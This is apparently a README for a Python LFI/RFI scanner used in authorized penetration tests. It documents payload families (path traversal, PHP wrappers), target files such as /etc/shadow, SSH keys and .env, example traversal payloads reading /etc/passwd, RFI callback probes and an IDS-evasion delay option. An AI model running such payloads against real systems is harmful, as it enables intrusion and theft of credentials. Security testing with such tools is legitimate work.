# LFI-RFI_Scanner

# 🔒 LFI-RFIv2 Scanner — LFI/RFI Vulnerability Scanner

> **For authorized penetration testing and security research only.**  
> Unauthorized use against systems you do not own or have explicit written permission to test is illegal. The author assumes no liability for misuse.

---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Usage](#usage)
  - [Basic Single URL Scan](#basic-single-url-scan)
  - [Scan Multiple URLs from File](#scan-multiple-urls-from-file)
  - [Burp Suite Request Files](#burp-suite-request-files)
  - [RFI Scanning](#rfi-scanning)
  - [Custom Payloads](#custom-payloads)
  - [Advanced Options](#advanced-options)
- [CLI Reference](#cli-reference)
- [Output & Reports](#output--reports)
- [Examples](#examples)

---

## Overview

Deep-LFI v2 is a comprehensive Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerability scanner for use during authorized web application penetration tests. It fires a large, curated payload library against all detected parameters (query string, POST body, path segments) and reports confirmed findings with severity ratings, matched signatures, and response snippets — all in a colored terminal view plus auto-generated HTML and optional JSON reports.

---

## Features

### Payload Coverage
- **Basic path traversal** — Linux, Windows, macOS (`../`, `..\`, mixed)
- **Null byte injection** — for PHP < 5.3.4 (`%00`, `\x00`, with extension suffixes)
- **URL encoding** — single (`%2F`), double (`%252F`), overlong UTF-8 (`%c0%af`, `%c1%1c`)
- **PHP wrappers** — `php://filter` (base64, iconv chains, rot13), `php://input`, `data://`, `expect://`, `file://`, `zip://`, `phar://`
- **Filter bypass** — doubled slashes, mixed separators (`....//`, `%5C`), dot sequences, space encoding (`%20`)
- **Path truncation** — PHP 4096-byte cutoff abuse (dot/slash padding)
- **Windows targets** — `win.ini`, `boot.ini`, `SAM`, `web.config`, `applicationHost.config`, XAMPP/WAMP stacks
- **Linux targets** — `/etc/passwd`, `/etc/shadow`, SSH keys, bash history, `/proc/self/*`, web server configs (Apache, Nginx, Lighttpd), database configs, `.env` files, WordPress/Drupal/Laravel configs, log files
- **macOS targets** — `/private/etc/*`, plist files, Keychain paths, Homebrew stacks

### Detection
- **LFI signatures** — 100+ regex patterns covering passwd entries, shadow hashes, SSH private keys, kernel info, web server configs, database credentials, `.env` secrets, base64-encoded file contents, PHP source code leaks, log file entries
- **RFI signatures** — detects remote shell execution responses
- **Error leakage** — flags `Warning: include`, `failed to open stream`, `open_basedir restriction`, and similar PHP errors as LOW-severity informational findings
- **Base64 decode** — automatically detects and decodes base64-encoded file contents from PHP wrapper responses

### Input Modes
- **Single URL** (`-u`) with GET or POST parameters
- **URL list file** (`--urls-file`) — one URL per line
- **Burp Suite request files** (`--burp-dir`) — raw HTTP text files and Burp XML export files, with optional host override (`--host`)

### Scan Scope
- **Query string parameters** — all key-value pairs in the URL
- **POST body parameters** — `application/x-www-form-urlencoded`
- **URL path segments** (`--path-scan`) — each path component tested as a potential injection point

### Performance & Control
- **Multithreaded** — configurable thread count (`--threads`, default: 5)
- **Request delay** — optional sleep between requests (`--delay`)
- **Timeout control** — per-request timeout (`--timeout`, default: 10s)
- **Proxy support** — route traffic through Burp/ZAP/mitmproxy (`--proxy`)
- **Cookie injection** — pass session cookies for authenticated scans (`--cookies`)
- **LFI-only / RFI-only** modes

### Reporting
- **Colored terminal output** — GREEN for info, CYAN for progress, YELLOW for LOW findings, RED/BRIGHT for HIGH confirmed vulns
- **Auto-generated HTML report** — dark-themed, severity-color-coded, includes payload, matched signature, HTTP status, and a 1000-character response snippet per finding
- **JSON report** (`-o`) — machine-readable findings for integration with other tools or bug-bounty platforms

---

## Requirements

- Python 3.7+
- pip packages:
  - `requests`
  - `colorama`
  - `urllib3`

---

## Installation

```bash
# 1. Clone the repository
git clone https://github.com/your-username/deep-lfi-v2.git
cd deep-lfi-v2

# 2. (Recommended) Create a virtual environment
python3 -m venv venv
source venv/bin/activate        # Linux / macOS
venv\Scripts\activate.bat       # Windows

# 3. Install dependencies
pip install requests colorama urllib3
```

No further setup is required. The scanner runs as a single Python script.

---

## Usage

### Basic Single URL Scan

```bash
python deep-lfi-v2.py -u "http://target.com/page.php?file=home"
```

Scans all query parameters in the URL with the full LFI + RFI payload set.

### POST Request

```bash
python deep-lfi-v2.py -u "http://target.com/load.php" -X POST -d "page=home&lang=en"
```

### Authenticated Scan with Cookies

```bash
python deep-lfi-v2.py -u "http://target.com/page.php?view=about" \
  --cookies "PHPSESSID=abc123; auth=token456"
```

### Scan URL Path Segments

```bash
python deep-lfi-v2.py -u "http://target.com/include/home/en" --path-scan
```

### Scan Multiple URLs from File

```bash
python deep-lfi-v2.py --urls-file targets.txt --threads 10
```

`targets.txt` format — one URL per line:
```
http://target.com/page.php?file=home
http://target.com/load.php?template=index
http://target.com/view.php?inc=about
```

### Burp Suite Request Files

Export requests from Burp Suite (raw text or XML) into a folder and point the scanner at it:

```bash
python deep-lfi-v2.py --burp-dir ./requests/ --threads 10
```

Override the target host (useful for exported requests with placeholder hosts):

```bash
python deep-lfi-v2.py --burp-dir ./burp/ --host 127.0.0.1:42001
```

Debug Burp file parsing:

```bash
python deep-lfi-v2.py --burp-dir ./burp/ --debug-burp
```

### RFI Scanning

RFI scanning requires an external server that returns a known token when fetched:

```bash
# With a self-hosted RFI probe server
python deep-lfi-v2.py -u "http://target.com/page.php?file=home" \
  --rfi-server "http://your-server.com/probe.php" \
  --rfi-token "MY_PROBE_TOKEN"

# Using a webhook.site UUID as the out-of-band callback
python deep-lfi-v2.py -u "http://target.com/page.php?file=home" \
  --rfi-webhook-id "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

# RFI only (skip LFI payloads)
python deep-lfi-v2.py -u "http://target.com/page.php?file=home" \
  --rfi-only --rfi-server "http://your-server.com/probe.php"
```

### Custom Payloads

Supply your own wordlists instead of (or alongside) the built-in payloads:

```bash
# Custom LFI wordlist
python deep-lfi-v2.py -u "http://target.com/page.php?file=home" \
  --lfi-payloads-file my_lfi_list.txt

# Custom RFI wordlist
python deep-lfi-v2.py -u "http://target.com/page.php?file=home" \
  --rfi-payloads-file my_rfi_list.txt

# Disable automatic payload expansion/mutation
python deep-lfi-v2.py -u "http://target.com/page.php?file=home" \
  --lfi-payloads-file my_lfi_list.txt --no-expand
```

### Advanced Options

```bash
# Route through Burp/ZAP proxy
python deep-lfi-v2.py -u "http://target.com/page.php?file=home" \
  --proxy http://127.0.0.1:8080

# Slow down requests (rate limiting / IDS evasion)
python deep-lfi-v2.py -u "http://target.com/page.php?file=home" \
  --delay 0.5 --threads 2

# LFI only (skip RFI probes)
python deep-lfi-v2.py -u "http://target.com/page.php?file=home" --lfi-only

# Save JSON report
python deep-lfi-v2.py -u "http://target.com/page.php?file=home" -o results.json

# Save HTML report to a specific path
python deep-lfi-v2.py -u "http://target.com/page.php?file=home" \
  --html-report scan_2024-01-01.html
```

---

## CLI Reference

| Argument | Group | Description |
|---|---|---|
| `-u`, `--url` | Targets | Single target URL |
| `-X`, `--method` | Targets | HTTP method (default: `GET`) |
| `-d`, `--data` | Targets | POST body (`key=val&key2=val2`) |
| `--cookies` | Targets | Cookie string (`name=val; name2=val2`) |
| `--urls-file FILE` | Targets | File with one URL per line |
| `--burp-dir DIR` | Targets | Folder of Burp request files (raw or XML) |
| `--host HOST` | Targets | Override target host:port (e.g. `127.0.0.1:42001`) |
| `--debug-burp` | Targets | Print debug info for Burp file parsing |
| `--rfi-server URL` | RFI | External RFI probe server URL |
| `--rfi-token TOKEN` | RFI | Token the probe server returns (default: `RFIPROBE_OK`) |
| `--rfi-webhook-id UUID` | RFI | webhook.site UUID for OOB RFI detection |
| `--lfi-payloads-file FILE` | Payloads | Custom LFI wordlist |
| `--rfi-payloads-file FILE` | Payloads | Custom RFI wordlist |
| `--no-expand` | Payloads | Skip built-in payload expansion/mutation |
| `--path-scan` | Scan | Also test URL path segments as injection points |
| `--lfi-only` | Scan | Run LFI payloads only |
| `--rfi-only` | Scan | Run RFI payloads only (requires `--rfi-server`) |
| `--threads N` | Scan | Concurrent threads (default: `5`) |
| `--timeout N` | Scan | Per-request timeout in seconds (default: `10`) |
| `--delay N` | Scan | Seconds to sleep between requests (default: `0`) |
| `-o`, `--output FILE` | Output | Save findings as JSON |
| `--html-report FILE` | Output | Save HTML report to specified path |
| `--proxy URL` | Output | HTTP proxy (e.g. `http://127.0.0.1:8080`) |

---

## Output & Reports

### Terminal

```
[+] Scanning parameter: file
[VULN] HIGH — LFI confirmed | param=file | payload=../../../../etc/passwd
       URL: http://target.com/page.php?file=../../../../etc/passwd
       Signature: root:x:0:0:
[!]   LOW  — Error leak | param=file
       URL: http://target.com/page.php?file=../etc/passwd
       Signature: Warning:.*include
```

### HTML Report

An HTML report is always auto-generated in the working directory as `lfi_rfi_report_<timestamp>.html` (or the path given by `--html-report`). It includes:

- Scan time and summary statistics (HIGH count, LOW count, total probes fired)
- Per-finding cards with severity color-coding, parameter name, full URL, payload used, matched signature, HTTP status code, output encoding label, and a scrollable 1000-character response snippet

### JSON Report (`-o`)

```json
[
  {
    "severity": "HIGH",
    "type": "LFI",
    "param": "file",
    "payload": "../../../../etc/passwd",
    "url": "http://target.com/page.php?file=../../../../etc/passwd",
    "signature": "root:x:0:0:",
    "status": 200,
    "encoding_label": "Plain Text",
    "raw_output": "root:x:0:0:root:/root:/bin/bash\n..."
  }
]
```

---

## Examples

```bash
# Quick scan of a single parameter
python deep-lfi-v2.py -u "http://target.com/index.php?page=about"

# Full scan with proxy, 10 threads, JSON + HTML output
python deep-lfi-v2.py -u "http://target.com/index.php?page=about" \
  --proxy http://127.0.0.1:8080 --threads 10 \
  -o report.json --html-report report.html

# Burp suite export folder with host override
python deep-lfi-v2.py --burp-dir ./requests/ --host 10.10.10.5:8080

# Authenticated scan from a URL list
python deep-lfi-v2.py --urls-file urls.txt \
  --cookies "session=abc123" --threads 8 --delay 0.2

# LFI only, path scan enabled, quiet rate-limited
python deep-lfi-v2.py -u "http://target.com/app/view/home" \
  --lfi-only --path-scan --threads 2 --delay 1
```

---

## Legal Disclaimer

This tool is provided for **authorized security testing and educational purposes only**. Running it against any target without explicit written permission from the system owner is illegal under computer fraud laws in most jurisdictions. The contributors accept no responsibility or liability for any misuse or damage caused by this software.
